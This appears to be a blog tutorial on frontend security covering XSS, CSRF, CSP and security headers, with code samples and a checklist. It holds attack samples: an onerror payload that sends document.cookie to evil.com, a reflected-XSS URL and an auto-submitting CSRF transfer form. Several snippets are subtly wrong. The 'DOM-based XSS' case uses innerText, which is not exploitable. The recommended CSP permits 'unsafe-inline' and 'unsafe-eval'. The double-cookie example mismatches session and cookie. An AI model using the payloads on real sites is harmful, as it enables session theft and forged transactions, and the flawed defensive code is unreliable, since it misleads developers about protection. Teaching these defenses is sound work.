---
title: "Frontend Security Protection: XSS, CSRF, and CSP Explained"
tag: security
description: "Comprehensive analysis of the three major frontend security threats: XSS, CSRF, and CSP, from attack principles to defense practices, providing production-grade security protection solutions."
date: "2023-08-25T08:00:00.000Z"
---

## Goal

Frontend security is an easily overlooked but far-reaching domain. XSS attacks can steal user cookies and hijack sessions; CSRF can impersonate users to perform malicious actions; misconfigured CSP is essentially useless. This article systematically explains the defense solutions for these three major security threats from attack principles, providing code practices that can be directly implemented in production.

## Background

### The Real Cost of Security Incidents

In recent years, incidents caused by frontend security vulnerabilities have been common:

- **XSS vulnerabilities**: Attackers inject malicious scripts to steal user data or hijack accounts
- **CSRF attacks**: Users visit malicious websites while logged in, and are impersonated to execute operations
- **Data leakage**: Sensitive information exposed to attackers through DOM or APIs

Frontend security is not a "nice-to-have" but a "must-get-right" baseline.

## XSS Attack and Defense

### Attack Types

**1. Reflected XSS**

```javascript
// Attacker constructs URL
// https://example.com/search?q=<script>alert('xss')</script>

// Insecure code
function search(query) {
  document.getElementById('results').innerHTML = `Search results: ${query}`;
}
```

**2. Stored XSS**

```javascript
// Malicious content stored in database
// Comment section injection
const comment = '<img src="x" onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">';

// Insecure rendering
<div dangerouslySetInnerHTML={{ __html: comment }} />
```

**3. DOM-based XSS**

```javascript
// Directly manipulating DOM from URL parameters
const name = new URLSearchParams(window.location.search).get('name');
document.getElementById('greeting').innerText = `Hello, ${name}`;
// URL: ?name=<img src=x onerror=alert(1)>
```

### Defense Solutions

**1. Input Sanitization**

```javascript
// Utility function: HTML entity escaping
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };
  return str.replace(/[&<>"'/]/g, char => map[char]);
}

// Usage
const userInput = '<script>alert("xss")</script>';
const safe = escapeHtml(userInput);
// Output: &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
```

**2. Security Practices in React**

```tsx
// ✅ Safe: React escapes by default
function SafeComponent({ content }) {
  return <div>{content}</div>;  // Automatically escapes HTML
}

// ❌ Dangerous: Using dangerouslySetInnerHTML
function UnsafeComponent({ content }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
}

// ✅ Safe: If you must use dangerouslySetInnerHTML, sanitize first
import DOMPurify from 'dompurify';

function SafeHtmlComponent({ content }) {
  const cleanHtml = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
    ALLOWED_ATTR: ['href'],
  });
  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}
```

**3. CSP (Content Security Policy)**

```javascript
// Next.js configuration
// next.config.js
module.exports = {
  headers: async () => [
    {
      source: '/(.*)',
      headers: [
        {
          key: 'Content-Security-Policy',
          value: [
            "default-src 'self'",
            "script-src 'self' 'unsafe-eval' 'unsafe-inline' https://cdn.example.com",
            "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
            "img-src 'self' data: https:",
            "font-src 'self' https://fonts.gstatic.com",
            "connect-src 'self' https://api.example.com",
            "frame-ancestors 'none'",
            "base-uri 'self'",
            "form-action 'self'",
          ].join('; '),
        },
      ],
    },
  ],
};
```

## CSRF Attack and Defense

### Attack Principle

```html
<!-- Attacker's malicious page -->
<body onload="document.getElementById('csrf-form').submit()">

<form id="csrf-form" action="https://bank.example.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker-account" />
  <input type="hidden" name="amount" value="10000" />
</form>

</body>
```

After the user logs into the bank website and visits the attacker's page, the browser automatically carries the Cookie to initiate a POST request.

### Defense Solutions

**1. CSRF Token**

```typescript
// Server generates CSRF Token
import crypto from 'crypto';

function generateCsrfToken(): string {
  return crypto.randomBytes(32).toString('hex');
}

// Middleware verification
function csrfMiddleware(req, res, next) {
  if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
    const token = req.headers['x-csrf-token'];
    const sessionToken = req.session.csrfToken;

    if (!token || token !== sessionToken) {
      return res.status(403).json({ error: 'Invalid CSRF token' });
    }
  }
  next();
}
```

```tsx
// Frontend carries CSRF Token
async function submitForm(data) {
  const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content');

  const response = await fetch('/api/submit', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    },
    body: JSON.stringify(data),
  });

  return response.json();
}
```

**2. SameSite Cookie**

```typescript
// Setting SameSite Cookie
res.setHeader('Set-Cookie', [
  'session=abc123; SameSite=Strict; HttpOnly; Secure; Path=/',
  'token=xyz789; SameSite=Lax; HttpOnly; Secure; Path=/',
]);
```

- **Strict**: Completely prohibits cross-site requests from carrying Cookies (strictest, but may affect normal navigation)
- **Lax**: Allows GET requests to carry cross-site (recommended for most scenarios)
- **None**: Allows cross-site carrying (must be used with Secure)

**3. Double Cookie Verification**

```typescript
// Server: Embed CSRF Token in HTML
app.get('/', (req, res) => {
  const csrfToken = generateCsrfToken();
  req.session.csrfToken = csrfToken;
  res.render('index', { csrfToken });
});

// Frontend: Read Token from Cookie and send in request header
async function apiRequest(url, options = {}) {
  const csrfToken = getCookie('csrf-token');

  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'X-CSRF-Token': csrfToken,
    },
  });
}
```

## Security Headers Configuration

### Complete Security Middleware

```typescript
// security.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function securityMiddleware(request: NextRequest) {
  const response = NextResponse.next();

  // X-Content-Type-Options: Prevent MIME type sniffing
  response.headers.set('X-Content-Type-Options', 'nosniff');

  // X-Frame-Options: Prevent clickjacking
  response.headers.set('X-Frame-Options', 'DENY');

  // X-XSS-Protection: Browser XSS filtering (deprecated, but kept for compatibility)
  response.headers.set('X-XSS-Protection', '1; mode=block');

  // Referrer-Policy: Control Referer header
  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');

  // Permissions-Policy: Disable unnecessary browser features
  response.headers.set(
    'Permissions-Policy',
    'camera=(), microphone=(), geolocation=(self), payment=(self)'
  );

  // Strict-Transport-Security: Force HTTPS
  response.headers.set(
    'Strict-Transport-Security',
    'max-age=63072000; includeSubDomains; preload'
  );

  // Content-Security-Policy
  response.headers.set(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';"
  );

  return response;
}
```

## Sensitive Data Protection

### Don't Store Sensitive Information on the Frontend

```typescript
// ❌ Wrong: localStorage stores sensitive data
localStorage.setItem('token', jwtToken);

// ✅ Correct: Use HttpOnly Cookie (set by server)
// Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict; Path=/

// ❌ Wrong: Passing sensitive information via URL parameters
// https://example.com/dashboard?token=xxx

// ✅ Correct: Use POST request body or Authorization header
fetch('/api/data', {
  headers: {
    'Authorization': `Bearer ${token}`,
  },
});
```

### API Response Filtering

```typescript
// Server: Filter sensitive fields
function sanitizeUser(user) {
  const { password, passwordHash, internalId, ...safeUser } = user;
  return safeUser;
}

app.get('/api/user/:id', (req, res) => {
  const user = db.users.findById(req.params.id);
  if (!user) return res.status(404).json({ error: 'Not found' });
  res.json(sanitizeUser(user));
});
```

## Security Checklist

```markdown
## Frontend Security Checklist

### XSS Protection
- [ ] User input is HTML entity escaped
- [ ] Avoid using dangerouslySetInnerHTML in React
- [ ] Use DOMPurify to filter rich text content
- [ ] CSP policy configured and enabled
- [ ] Inline scripts disabled (nonce or hash)

### CSRF Protection
- [ ] State-modifying operations use POST/PUT/DELETE
- [ ] CSRF Token verification
- [ ] SameSite Cookie configuration
- [ ] Origin/Referer header verification

### Data Protection
- [ ] Sensitive data not stored in localStorage
- [ ] API responses filter sensitive fields
- [ ] Transport layer uses HTTPS
- [ ] Passwords and sensitive information not logged

### Security Headers
- [ ] X-Content-Type-Options: nosniff
- [ ] X-Frame-Options: DENY
- [ ] Strict-Transport-Security
- [ ] Referrer-Policy
- [ ] Permissions-Policy
```

## Conclusion

Frontend security is a systematic engineering effort requiring multi-layered defense:

1. **Input validation**: All user input is untrusted and must be validated and filtered
2. **Output encoding**: Choose appropriate encoding methods based on context during rendering
3. **CSP**: As the last line of defense, restrict script sources
4. **Cookie security**: SameSite + HttpOnly + Secure trio
5. **Security headers**: Defend against clickjacking, MIME sniffing, and other common attacks

Security is not a one-time effort but a continuous process. It is recommended to incorporate security checks into the CI/CD pipeline and use automated tools to scan for common vulnerabilities.
